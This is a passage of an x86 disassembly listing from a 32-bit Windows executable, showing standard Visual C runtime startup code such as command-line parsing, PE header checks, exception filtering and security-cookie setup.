  403318:	ff 15 a8 6b 40 00    	call   *0x406ba8
  40331e:	a1 f4 40 40 00       	mov    0x4040f4,%eax
  403323:	8b 30                	mov    (%eax),%esi
  403325:	89 75 e0             	mov    %esi,-0x20(%ebp)
  403328:	8a 06                	mov    (%esi),%al
  40332a:	3c 20                	cmp    $0x20,%al
  40332c:	77 4c                	ja     0x40337a
  40332e:	84 c0                	test   %al,%al
  403330:	74 06                	je     0x403338
  403332:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  403336:	75 42                	jne    0x40337a
  403338:	8a 06                	mov    (%esi),%al
  40333a:	84 c0                	test   %al,%al
  40333c:	74 0a                	je     0x403348
  40333e:	3c 20                	cmp    $0x20,%al
  403340:	77 06                	ja     0x403348
  403342:	46                   	inc    %esi
  403343:	89 75 e0             	mov    %esi,-0x20(%ebp)
  403346:	eb f0                	jmp    0x403338
  403348:	f6 45 c4 01          	testb  $0x1,-0x3c(%ebp)
  40334c:	74 06                	je     0x403354
  40334e:	0f b7 45 c8          	movzwl -0x38(%ebp),%eax
  403352:	eb 03                	jmp    0x403357
  403354:	6a 0a                	push   $0xa
  403356:	58                   	pop    %eax
  403357:	50                   	push   %eax
  403358:	56                   	push   %esi
  403359:	6a 00                	push   $0x0
  40335b:	68 00 00 40 00       	push   $0x400000
  403360:	e8 9b dc ff ff       	call   0x401000
  403365:	a3 54 68 40 00       	mov    %eax,0x406854
  40336a:	83 3d 48 68 40 00 00 	cmpl   $0x0,0x406848
  403371:	75 5b                	jne    0x4033ce
  403373:	50                   	push   %eax
  403374:	ff 15 f8 40 40 00    	call   *0x4040f8
  40337a:	3c 22                	cmp    $0x22,%al
  40337c:	75 0b                	jne    0x403389
  40337e:	33 c9                	xor    %ecx,%ecx
  403380:	39 4d e4             	cmp    %ecx,-0x1c(%ebp)
  403383:	0f 94 c1             	sete   %cl
  403386:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  403389:	0f b6 c0             	movzbl %al,%eax
  40338c:	50                   	push   %eax
  40338d:	ff 15 fc 40 40 00    	call   *0x4040fc
  403393:	59                   	pop    %ecx
  403394:	85 c0                	test   %eax,%eax
  403396:	74 04                	je     0x40339c
  403398:	46                   	inc    %esi
  403399:	89 75 e0             	mov    %esi,-0x20(%ebp)
  40339c:	46                   	inc    %esi
  40339d:	eb 86                	jmp    0x403325
  40339f:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4033a2:	8b 08                	mov    (%eax),%ecx
  4033a4:	8b 09                	mov    (%ecx),%ecx
  4033a6:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  4033a9:	50                   	push   %eax
  4033aa:	51                   	push   %ecx
  4033ab:	e8 9e 02 00 00       	call   0x40364e
  4033b0:	59                   	pop    %ecx
  4033b1:	59                   	pop    %ecx
  4033b2:	c3                   	ret
  4033b3:	8b 65 e8             	mov    -0x18(%ebp),%esp
  4033b6:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4033b9:	a3 54 68 40 00       	mov    %eax,0x406854
  4033be:	83 3d 48 68 40 00 00 	cmpl   $0x0,0x406848
  4033c5:	75 07                	jne    0x4033ce
  4033c7:	50                   	push   %eax
  4033c8:	ff 15 04 41 40 00    	call   *0x404104
  4033ce:	83 3d 58 68 40 00 00 	cmpl   $0x0,0x406858
  4033d5:	75 06                	jne    0x4033dd
  4033d7:	ff 15 08 41 40 00    	call   *0x404108
  4033dd:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4033e4:	a1 54 68 40 00       	mov    0x406854,%eax
  4033e9:	eb 13                	jmp    0x4033fe
  4033eb:	33 c0                	xor    %eax,%eax
  4033ed:	40                   	inc    %eax
  4033ee:	c3                   	ret
  4033ef:	8b 65 e8             	mov    -0x18(%ebp),%esp
  4033f2:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4033f9:	b8 ff 00 00 00       	mov    $0xff,%eax
  4033fe:	e8 fe 03 00 00       	call   0x403801
  403403:	c3                   	ret
  403404:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
  403409:	66 39 05 00 00 40 00 	cmp    %ax,0x400000
  403410:	74 04                	je     0x403416
  403412:	33 c0                	xor    %eax,%eax
  403414:	eb 4d                	jmp    0x403463
  403416:	a1 3c 00 40 00       	mov    0x40003c,%eax
  40341b:	8d 80 00 00 40 00    	lea    0x400000(%eax),%eax
  403421:	81 38 50 45 00 00    	cmpl   $0x4550,(%eax)
  403427:	75 e9                	jne    0x403412
  403429:	0f b7 48 18          	movzwl 0x18(%eax),%ecx
  40342d:	81 f9 0b 01 00 00    	cmp    $0x10b,%ecx
  403433:	74 1b                	je     0x403450
  403435:	81 f9 0b 02 00 00    	cmp    $0x20b,%ecx
  40343b:	75 d5                	jne    0x403412
  40343d:	83 b8 84 00 00 00 0e 	cmpl   $0xe,0x84(%eax)
  403444:	76 cc                	jbe    0x403412
  403446:	33 c9                	xor    %ecx,%ecx
  403448:	39 88 f8 00 00 00    	cmp    %ecx,0xf8(%eax)
  40344e:	eb 0e                	jmp    0x40345e
  403450:	83 78 74 0e          	cmpl   $0xe,0x74(%eax)
  403454:	76 bc                	jbe    0x403412
  403456:	33 c9                	xor    %ecx,%ecx
  403458:	39 88 e8 00 00 00    	cmp    %ecx,0xe8(%eax)
  40345e:	0f 95 c1             	setne  %cl
  403461:	8b c1                	mov    %ecx,%eax
  403463:	6a 02                	push   $0x2
  403465:	a3 48 68 40 00       	mov    %eax,0x406848
  40346a:	ff 15 d0 40 40 00    	call   *0x4040d0
  403470:	6a ff                	push   $0xffffffff
  403472:	ff 15 d4 40 40 00    	call   *0x4040d4
  403478:	59                   	pop    %ecx
  403479:	59                   	pop    %ecx
  40347a:	a3 a0 6b 40 00       	mov    %eax,0x406ba0
  40347f:	a3 a4 6b 40 00       	mov    %eax,0x406ba4
  403484:	ff 15 d8 40 40 00    	call   *0x4040d8
  40348a:	8b 0d 6c 68 40 00    	mov    0x40686c,%ecx
  403490:	89 08                	mov    %ecx,(%eax)
  403492:	ff 15 dc 40 40 00    	call   *0x4040dc
  403498:	8b 0d 68 68 40 00    	mov    0x406868,%ecx
  40349e:	89 08                	mov    %ecx,(%eax)
  4034a0:	a1 e0 40 40 00       	mov    0x4040e0,%eax
  4034a5:	8b 00                	mov    (%eax),%eax
  4034a7:	a3 94 6b 40 00       	mov    %eax,0x406b94
  4034ac:	e8 51 01 00 00       	call   0x403602
  4034b1:	e8 af 03 00 00       	call   0x403865
  4034b6:	83 3d 0c 60 40 00 00 	cmpl   $0x0,0x40600c
  4034bd:	75 0c                	jne    0x4034cb
  4034bf:	68 65 38 40 00       	push   $0x403865
  4034c4:	ff 15 e4 40 40 00    	call   *0x4040e4
  4034ca:	59                   	pop    %ecx
  4034cb:	e8 6a 03 00 00       	call   0x40383a
  4034d0:	83 3d 08 60 40 00 ff 	cmpl   $0xffffffff,0x406008
  4034d7:	75 09                	jne    0x4034e2
  4034d9:	6a ff                	push   $0xffffffff
  4034db:	ff 15 e8 40 40 00    	call   *0x4040e8
  4034e1:	59                   	pop    %ecx
  4034e2:	33 c0                	xor    %eax,%eax
  4034e4:	c3                   	ret
  4034e5:	e8 7e 03 00 00       	call   0x403868
  4034ea:	e9 36 fd ff ff       	jmp    0x403225
  4034ef:	8b ff                	mov    %edi,%edi
  4034f1:	55                   	push   %ebp
  4034f2:	8b ec                	mov    %esp,%ebp
  4034f4:	8b 45 08             	mov    0x8(%ebp),%eax
  4034f7:	8b 00                	mov    (%eax),%eax
  4034f9:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%eax)
  4034ff:	75 2a                	jne    0x40352b
  403501:	83 78 10 03          	cmpl   $0x3,0x10(%eax)
  403505:	75 24                	jne    0x40352b
  403507:	8b 40 14             	mov    0x14(%eax),%eax
  40350a:	3d 20 05 93 19       	cmp    $0x19930520,%eax
  40350f:	74 15                	je     0x403526
  403511:	3d 21 05 93 19       	cmp    $0x19930521,%eax
  403516:	74 0e                	je     0x403526
  403518:	3d 22 05 93 19       	cmp    $0x19930522,%eax
  40351d:	74 07                	je     0x403526
  40351f:	3d 00 40 99 01       	cmp    $0x1994000,%eax
  403524:	75 05                	jne    0x40352b
  403526:	e8 d3 03 00 00       	call   0x4038fe
  40352b:	33 c0                	xor    %eax,%eax
  40352d:	5d                   	pop    %ebp
  40352e:	c2 04 00             	ret    $0x4
  403531:	68 ef 34 40 00       	push   $0x4034ef
  403536:	ff 15 34 40 40 00    	call   *0x404034
  40353c:	33 c0                	xor    %eax,%eax
  40353e:	c3                   	ret
  40353f:	cc                   	int3
  403540:	ff 25 10 41 40 00    	jmp    *0x404110
  403546:	6a 14                	push   $0x14
  403548:	68 50 56 40 00       	push   $0x405650
  40354d:	e8 6a 02 00 00       	call   0x4037bc
  403552:	ff 35 a4 6b 40 00    	push   0x406ba4
  403558:	8b 35 b8 40 40 00    	mov    0x4040b8,%esi
  40355e:	ff d6                	call   *%esi
  403560:	59                   	pop    %ecx
  403561:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  403564:	83 f8 ff             	cmp    $0xffffffff,%eax
  403567:	75 0c                	jne    0x403575
  403569:	ff 75 08             	push   0x8(%ebp)
  40356c:	ff 15 bc 40 40 00    	call   *0x4040bc
  403572:	59                   	pop    %ecx
  403573:	eb 67                	jmp    0x4035dc
  403575:	6a 08                	push   $0x8
  403577:	e8 94 03 00 00       	call   0x403910
  40357c:	59                   	pop    %ecx
  40357d:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  403581:	ff 35 a4 6b 40 00    	push   0x406ba4
  403587:	ff d6                	call   *%esi
  403589:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40358c:	ff 35 a0 6b 40 00    	push   0x406ba0
  403592:	ff d6                	call   *%esi
  403594:	59                   	pop    %ecx
  403595:	59                   	pop    %ecx
  403596:	89 45 e0             	mov    %eax,-0x20(%ebp)
  403599:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40359c:	50                   	push   %eax
  40359d:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4035a0:	50                   	push   %eax
  4035a1:	ff 75 08             	push   0x8(%ebp)
  4035a4:	8b 35 d4 40 40 00    	mov    0x4040d4,%esi
  4035aa:	ff d6                	call   *%esi
  4035ac:	59                   	pop    %ecx
  4035ad:	50                   	push   %eax
  4035ae:	e8 57 03 00 00       	call   0x40390a
  4035b3:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4035b6:	ff 75 e4             	push   -0x1c(%ebp)
  4035b9:	ff d6                	call   *%esi
  4035bb:	a3 a4 6b 40 00       	mov    %eax,0x406ba4
  4035c0:	ff 75 e0             	push   -0x20(%ebp)
  4035c3:	ff d6                	call   *%esi
  4035c5:	83 c4 14             	add    $0x14,%esp
  4035c8:	a3 a0 6b 40 00       	mov    %eax,0x406ba0
  4035cd:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4035d4:	e8 09 00 00 00       	call   0x4035e2
  4035d9:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4035dc:	e8 20 02 00 00       	call   0x403801
  4035e1:	c3                   	ret
  4035e2:	6a 08                	push   $0x8
  4035e4:	e8 1b 03 00 00       	call   0x403904
  4035e9:	59                   	pop    %ecx
  4035ea:	c3                   	ret
  4035eb:	8b ff                	mov    %edi,%edi
  4035ed:	55                   	push   %ebp
  4035ee:	8b ec                	mov    %esp,%ebp
  4035f0:	ff 75 08             	push   0x8(%ebp)
  4035f3:	e8 4e ff ff ff       	call   0x403546
  4035f8:	f7 d8                	neg    %eax
  4035fa:	1b c0                	sbb    %eax,%eax
  4035fc:	f7 d8                	neg    %eax
  4035fe:	59                   	pop    %ecx
  4035ff:	48                   	dec    %eax
  403600:	5d                   	pop    %ebp
  403601:	c3                   	ret
  403602:	8b ff                	mov    %edi,%edi
  403604:	56                   	push   %esi
  403605:	b8 18 56 40 00       	mov    $0x405618,%eax
  40360a:	be 18 56 40 00       	mov    $0x405618,%esi
  40360f:	57                   	push   %edi
  403610:	8b f8                	mov    %eax,%edi
  403612:	3b c6                	cmp    %esi,%eax
  403614:	73 0f                	jae    0x403625
  403616:	8b 07                	mov    (%edi),%eax
  403618:	85 c0                	test   %eax,%eax
  40361a:	74 02                	je     0x40361e
  40361c:	ff d0                	call   *%eax
  40361e:	83 c7 04             	add    $0x4,%edi
  403621:	3b fe                	cmp    %esi,%edi
  403623:	72 f1                	jb     0x403616
  403625:	5f                   	pop    %edi
  403626:	5e                   	pop    %esi
  403627:	c3                   	ret
  403628:	8b ff                	mov    %edi,%edi
  40362a:	56                   	push   %esi
  40362b:	b8 20 56 40 00       	mov    $0x405620,%eax
  403630:	be 20 56 40 00       	mov    $0x405620,%esi
  403635:	57                   	push   %edi
  403636:	8b f8                	mov    %eax,%edi
  403638:	3b c6                	cmp    %esi,%eax
  40363a:	73 0f                	jae    0x40364b
  40363c:	8b 07                	mov    (%edi),%eax
  40363e:	85 c0                	test   %eax,%eax
  403640:	74 02                	je     0x403644
  403642:	ff d0                	call   *%eax
  403644:	83 c7 04             	add    $0x4,%edi
  403647:	3b fe                	cmp    %esi,%edi
  403649:	72 f1                	jb     0x40363c
  40364b:	5f                   	pop    %edi
  40364c:	5e                   	pop    %esi
  40364d:	c3                   	ret
  40364e:	ff 25 00 41 40 00    	jmp    *0x404100
  403654:	cc                   	int3
  403655:	cc                   	int3
  403656:	cc                   	int3
  403657:	cc                   	int3
  403658:	cc                   	int3
  403659:	cc                   	int3
  40365a:	cc                   	int3
  40365b:	cc                   	int3
  40365c:	cc                   	int3
  40365d:	cc                   	int3
  40365e:	cc                   	int3
  40365f:	cc                   	int3
  403660:	8b ff                	mov    %edi,%edi
  403662:	55                   	push   %ebp
  403663:	8b ec                	mov    %esp,%ebp
  403665:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403668:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
  40366d:	66 39 01             	cmp    %ax,(%ecx)
  403670:	74 04                	je     0x403676
  403672:	33 c0                	xor    %eax,%eax
  403674:	5d                   	pop    %ebp
  403675:	c3                   	ret
  403676:	8b 41 3c             	mov    0x3c(%ecx),%eax
  403679:	03 c1                	add    %ecx,%eax
  40367b:	81 38 50 45 00 00    	cmpl   $0x4550,(%eax)
  403681:	75 ef                	jne    0x403672
  403683:	33 d2                	xor    %edx,%edx
  403685:	b9 0b 01 00 00       	mov    $0x10b,%ecx
  40368a:	66 39 48 18          	cmp    %cx,0x18(%eax)
  40368e:	0f 94 c2             	sete   %dl
  403691:	8b c2                	mov    %edx,%eax
  403693:	5d                   	pop    %ebp
  403694:	c3                   	ret
  403695:	cc                   	int3
  403696:	cc                   	int3
  403697:	cc                   	int3
  403698:	cc                   	int3
  403699:	cc                   	int3
  40369a:	cc                   	int3
  40369b:	cc                   	int3
  40369c:	cc                   	int3
  40369d:	cc                   	int3
  40369e:	cc                   	int3
  40369f:	cc                   	int3
  4036a0:	8b ff                	mov    %edi,%edi
  4036a2:	55                   	push   %ebp
  4036a3:	8b ec                	mov    %esp,%ebp
  4036a5:	8b 45 08             	mov    0x8(%ebp),%eax
  4036a8:	8b 48 3c             	mov    0x3c(%eax),%ecx
  4036ab:	03 c8                	add    %eax,%ecx
  4036ad:	0f b7 41 14          	movzwl 0x14(%ecx),%eax
  4036b1:	53                   	push   %ebx
  4036b2:	56                   	push   %esi
  4036b3:	0f b7 71 06          	movzwl 0x6(%ecx),%esi
  4036b7:	33 d2                	xor    %edx,%edx
  4036b9:	57                   	push   %edi
  4036ba:	8d 44 08 18          	lea    0x18(%eax,%ecx,1),%eax
  4036be:	85 f6                	test   %esi,%esi
  4036c0:	76 1b                	jbe    0x4036dd
  4036c2:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4036c5:	8b 48 0c             	mov    0xc(%eax),%ecx
  4036c8:	3b f9                	cmp    %ecx,%edi
  4036ca:	72 09                	jb     0x4036d5
  4036cc:	8b 58 08             	mov    0x8(%eax),%ebx
  4036cf:	03 d9                	add    %ecx,%ebx
  4036d1:	3b fb                	cmp    %ebx,%edi
  4036d3:	72 0a                	jb     0x4036df
  4036d5:	42                   	inc    %edx
  4036d6:	83 c0 28             	add    $0x28,%eax
  4036d9:	3b d6                	cmp    %esi,%edx
  4036db:	72 e8                	jb     0x4036c5
  4036dd:	33 c0                	xor    %eax,%eax
  4036df:	5f                   	pop    %edi
  4036e0:	5e                   	pop    %esi
  4036e1:	5b                   	pop    %ebx
  4036e2:	5d                   	pop    %ebp
  4036e3:	c3                   	ret
  4036e4:	cc                   	int3
  4036e5:	cc                   	int3
  4036e6:	cc                   	int3
  4036e7:	cc                   	int3
  4036e8:	cc                   	int3
  4036e9:	cc                   	int3
  4036ea:	cc                   	int3
  4036eb:	cc                   	int3
  4036ec:	cc                   	int3
  4036ed:	cc                   	int3
  4036ee:	cc                   	int3
  4036ef:	cc                   	int3
  4036f0:	8b ff                	mov    %edi,%edi
  4036f2:	55                   	push   %ebp
  4036f3:	8b ec                	mov    %esp,%ebp
  4036f5:	6a fe                	push   $0xfffffffe
  4036f7:	68 70 56 40 00       	push   $0x405670
  4036fc:	68 15 38 40 00       	push   $0x403815
  403701:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403707:	50                   	push   %eax
  403708:	83 ec 08             	sub    $0x8,%esp
  40370b:	53                   	push   %ebx
  40370c:	56                   	push   %esi
  40370d:	57                   	push   %edi
  40370e:	a1 10 60 40 00       	mov    0x406010,%eax
  403713:	31 45 f8             	xor    %eax,-0x8(%ebp)
  403716:	33 c5                	xor    %ebp,%eax
  403718:	50                   	push   %eax
  403719:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40371c:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  403722:	89 65 e8             	mov    %esp,-0x18(%ebp)
  403725:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40372c:	68 00 00 40 00       	push   $0x400000
  403731:	e8 2a ff ff ff       	call   0x403660
  403736:	83 c4 04             	add    $0x4,%esp
  403739:	85 c0                	test   %eax,%eax
  40373b:	74 55                	je     0x403792
  40373d:	8b 45 08             	mov    0x8(%ebp),%eax
  403740:	2d 00 00 40 00       	sub    $0x400000,%eax
  403745:	50                   	push   %eax
  403746:	68 00 00 40 00       	push   $0x400000
  40374b:	e8 50 ff ff ff       	call   0x4036a0
  403750:	83 c4 08             	add    $0x8,%esp
  403753:	85 c0                	test   %eax,%eax
  403755:	74 3b                	je     0x403792
  403757:	8b 40 24             	mov    0x24(%eax),%eax
  40375a:	c1 e8 1f             	shr    $0x1f,%eax
  40375d:	f7 d0                	not    %eax
  40375f:	83 e0 01             	and    $0x1,%eax
  403762:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  403769:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40376c:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403773:	59                   	pop    %ecx
  403774:	5f                   	pop    %edi
  403775:	5e                   	pop    %esi
  403776:	5b                   	pop    %ebx
  403777:	8b e5                	mov    %ebp,%esp
  403779:	5d                   	pop    %ebp
  40377a:	c3                   	ret
  40377b:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40377e:	8b 08                	mov    (%eax),%ecx
  403780:	8b 01                	mov    (%ecx),%eax
  403782:	33 d2                	xor    %edx,%edx
  403784:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
  403789:	0f 94 c2             	sete   %dl
  40378c:	8b c2                	mov    %edx,%eax
  40378e:	c3                   	ret
  40378f:	8b 65 e8             	mov    -0x18(%ebp),%esp
  403792:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  403799:	33 c0                	xor    %eax,%eax
  40379b:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40379e:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4037a5:	59                   	pop    %ecx
  4037a6:	5f                   	pop    %edi
  4037a7:	5e                   	pop    %esi
  4037a8:	5b                   	pop    %ebx
  4037a9:	8b e5                	mov    %ebp,%esp
  4037ab:	5d                   	pop    %ebp
  4037ac:	c3                   	ret
  4037ad:	cc                   	int3
  4037ae:	ff 25 f0 40 40 00    	jmp    *0x4040f0
  4037b4:	ff 25 ec 40 40 00    	jmp    *0x4040ec
  4037ba:	cc                   	int3
  4037bb:	cc                   	int3
  4037bc:	68 15 38 40 00       	push   $0x403815
  4037c1:	64 ff 35 00 00 00 00 	push   %fs:0x0
  4037c8:	8b 44 24 10          	mov    0x10(%esp),%eax
  4037cc:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  4037d0:	8d 6c 24 10          	lea    0x10(%esp),%ebp
  4037d4:	2b e0                	sub    %eax,%esp
  4037d6:	53                   	push   %ebx
  4037d7:	56                   	push   %esi
  4037d8:	57                   	push   %edi
  4037d9:	a1 10 60 40 00       	mov    0x406010,%eax
  4037de:	31 45 fc             	xor    %eax,-0x4(%ebp)
  4037e1:	33 c5                	xor    %ebp,%eax
  4037e3:	50                   	push   %eax
  4037e4:	89 65 e8             	mov    %esp,-0x18(%ebp)
  4037e7:	ff 75 f8             	push   -0x8(%ebp)
  4037ea:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4037ed:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4037f4:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4037f7:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4037fa:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  403800:	c3                   	ret
  403801:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403804:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40380b:	59                   	pop    %ecx
  40380c:	5f                   	pop    %edi
  40380d:	5f                   	pop    %edi
  40380e:	5e                   	pop    %esi
  40380f:	5b                   	pop    %ebx
  403810:	8b e5                	mov    %ebp,%esp
  403812:	5d                   	pop    %ebp
  403813:	51                   	push   %ecx
  403814:	c3                   	ret
  403815:	8b ff                	mov    %edi,%edi
  403817:	55                   	push   %ebp
  403818:	8b ec                	mov    %esp,%ebp
  40381a:	ff 75 14             	push   0x14(%ebp)
  40381d:	ff 75 10             	push   0x10(%ebp)
  403820:	ff 75 0c             	push   0xc(%ebp)
  403823:	ff 75 08             	push   0x8(%ebp)
  403826:	68 16 39 40 00       	push   $0x403916
  40382b:	68 10 60 40 00       	push   $0x406010
  403830:	e8 f1 00 00 00       	call   0x403926
  403835:	83 c4 18             	add    $0x18,%esp
  403838:	5d                   	pop    %ebp
  403839:	c3                   	ret
  40383a:	8b ff                	mov    %edi,%edi
  40383c:	56                   	push   %esi
  40383d:	68 00 00 03 00       	push   $0x30000
  403842:	68 00 00 01 00       	push   $0x10000
  403847:	33 f6                	xor    %esi,%esi
  403849:	56                   	push   %esi
  40384a:	e8 e3 00 00 00       	call   0x403932
  40384f:	83 c4 0c             	add    $0xc,%esp
  403852:	85 c0                	test   %eax,%eax
  403854:	74 0d                	je     0x403863
  403856:	56                   	push   %esi
  403857:	56                   	push   %esi
  403858:	56                   	push   %esi
  403859:	56                   	push   %esi
  40385a:	56                   	push   %esi
  40385b:	e8 cc 00 00 00       	call   0x40392c
  403860:	83 c4 14             	add    $0x14,%esp
  403863:	5e                   	pop    %esi
  403864:	c3                   	ret
  403865:	33 c0                	xor    %eax,%eax
  403867:	c3                   	ret
  403868:	8b ff                	mov    %edi,%edi
  40386a:	55                   	push   %ebp
  40386b:	8b ec                	mov    %esp,%ebp
  40386d:	83 ec 10             	sub    $0x10,%esp
  403870:	a1 10 60 40 00       	mov    0x406010,%eax
  403875:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  403879:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40387d:	53                   	push   %ebx
  40387e:	57                   	push   %edi
  40387f:	bf 4e e6 40 bb       	mov    $0xbb40e64e,%edi
  403884:	bb 00 00 ff ff       	mov    $0xffff0000,%ebx
  403889:	3b c7                	cmp    %edi,%eax
  40388b:	74 0d                	je     0x40389a
  40388d:	85 c3                	test   %eax,%ebx
  40388f:	74 09                	je     0x40389a
  403891:	f7 d0                	not    %eax
  403893:	a3 14 60 40 00       	mov    %eax,0x406014
  403898:	eb 60                	jmp    0x4038fa
  40389a:	56                   	push   %esi
  40389b:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40389e:	50                   	push   %eax
  40389f:	ff 15 20 40 40 00    	call   *0x404020
  4038a5:	8b 75 fc             	mov    -0x4(%ebp),%esi
  4038a8:	33 75 f8             	xor    -0x8(%ebp),%esi
  4038ab:	ff 15 24 40 40 00    	call   *0x404024
  4038b1:	33 f0                	xor    %eax,%esi
  4038b3:	ff 15 28 40 40 00    	call   *0x404028
  4038b9:	33 f0                	xor    %eax,%esi
  4038bb:	ff 15 2c 40 40 00    	call   *0x40402c
  4038c1:	33 f0                	xor    %eax,%esi
  4038c3:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4038c6:	50                   	push   %eax
  4038c7:	ff 15 30 40 40 00    	call   *0x404030
  4038cd:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4038d0:	33 45 f0             	xor    -0x10(%ebp),%eax
  4038d3:	33 f0                	xor    %eax,%esi
  4038d5:	3b f7                	cmp    %edi,%esi
  4038d7:	75 07                	jne    0x4038e0
  4038d9:	be 4f e6 40 bb       	mov    $0xbb40e64f,%esi
  4038de:	eb 0b                	jmp    0x4038eb
  4038e0:	85 f3                	test   %esi,%ebx
  4038e2:	75 07                	jne    0x4038eb
  4038e4:	8b c6                	mov    %esi,%eax
  4038e6:	c1 e0 10             	shl    $0x10,%eax
  4038e9:	0b f0                	or     %eax,%esi
  4038eb:	89 35 10 60 40 00    	mov    %esi,0x406010
  4038f1:	f7 d6                	not    %esi
  4038f3:	89 35 14 60 40 00    	mov    %esi,0x406014
  4038f9:	5e                   	pop    %esi
  4038fa:	5f                   	pop    %edi
  4038fb:	5b                   	pop    %ebx
  4038fc:	c9                   	leave
  4038fd:	c3                   	ret
  4038fe:	ff 25 cc 40 40 00    	jmp    *0x4040cc
  403904:	ff 25 c8 40 40 00    	jmp    *0x4040c8
  40390a:	ff 25 c4 40 40 00    	jmp    *0x4040c4
  403910:	ff 25 c0 40 40 00    	jmp    *0x4040c0
  403916:	3b 0d 10 60 40 00    	cmp    0x406010,%ecx
  40391c:	75 02                	jne    0x403920
  40391e:	f3 c3                	repz ret
  403920:	e9 13 00 00 00       	jmp    0x403938
  403925:	cc                   	int3
  403926:	ff 25 b4 40 40 00    	jmp    *0x4040b4
  40392c:	ff 25 b0 40 40 00    	jmp    *0x4040b0
  403932:	ff 25 ac 40 40 00    	jmp    *0x4040ac
  403938:	8b ff                	mov    %edi,%edi
  40393a:	55                   	push   %ebp
  40393b:	8b ec                	mov    %esp,%ebp
  40393d:	81 ec 28 03 00 00    	sub    $0x328,%esp
  403943:	a3 78 69 40 00       	mov    %eax,0x406978
  403948:	89 0d 74 69 40 00    	mov    %ecx,0x406974
  40394e:	89 15 70 69 40 00    	mov    %edx,0x406970
  403954:	89 1d 6c 69 40 00    	mov    %ebx,0x40696c
  40395a:	89 35 68 69 40 00    	mov    %esi,0x406968
  403960:	89 3d 64 69 40 00    	mov    %edi,0x406964
  403966:	66 8c 15 90 69 40 00 	data16 mov %ss,0x406990
  40396d:	66 8c 0d 84 69 40 00 	data16 mov %cs,0x406984
  403974:	66 8c 1d 60 69 40 00 	data16 mov %ds,0x406960
  40397b:	66 8c 05 5c 69 40 00 	data16 mov %es,0x40695c
  403982:	66 8c 25 58 69 40 00 	data16 mov %fs,0x406958
  403989:	66 8c 2d 54 69 40 00 	data16 mov %gs,0x406954
  403990:	9c                   	pushf
  403991:	8f 05 88 69 40 00    	pop    0x406988
  403997:	8b 45 00             	mov    0x0(%ebp),%eax
  40399a:	a3 7c 69 40 00       	mov    %eax,0x40697c
  40399f:	8b 45 04             	mov    0x4(%ebp),%eax
  4039a2:	a3 80 69 40 00       	mov    %eax,0x406980
  4039a7:	8d 45 08             	lea    0x8(%ebp),%eax
  4039aa:	a3 8c 69 40 00       	mov    %eax,0x40698c
  4039af:	8b 85 e0 fc ff ff    	mov    -0x320(%ebp),%eax
  4039b5:	c7 05 c8 68 40 00 01 	movl   $0x10001,0x4068c8
  4039bc:	00 01 00 
  4039bf:	a1 80 69 40 00       	mov    0x406980,%eax
  4039c4:	a3 7c 68 40 00       	mov    %eax,0x40687c
  4039c9:	c7 05 70 68 40 00 09 	movl   $0xc0000409,0x406870
  4039d0:	04 00 c0 
  4039d3:	c7 05 74 68 40 00 01 	movl   $0x1,0x406874
  4039da:	00 00 00 
  4039dd:	a1 10 60 40 00       	mov    0x406010,%eax
  4039e2:	89 85 d8 fc ff ff    	mov    %eax,-0x328(%ebp)
  4039e8:	a1 14 60 40 00       	mov    0x406014,%eax
  4039ed:	89 85 dc fc ff ff    	mov    %eax,-0x324(%ebp)
  4039f3:	ff 15 10 40 40 00    	call   *0x404010
  4039f9:	a3 c0 68 40 00       	mov    %eax,0x4068c0
  4039fe:	6a 01                	push   $0x1
  403a00:	e8 39 00 00 00       	call   0x403a3e
  403a05:	59                   	pop    %ecx
  403a06:	6a 00                	push   $0x0
  403a08:	ff 15 34 40 40 00    	call   *0x404034
  403a0e:	68 c0 55 40 00       	push   $0x4055c0
  403a13:	ff 15 14 40 40 00    	call   *0x404014
  403a19:	83 3d c0 68 40 00 00 	cmpl   $0x0,0x4068c0
  403a20:	75 08                	jne    0x403a2a
  403a22:	6a 01                	push   $0x1
  403a24:	e8 15 00 00 00       	call   0x403a3e
  403a29:	59                   	pop    %ecx
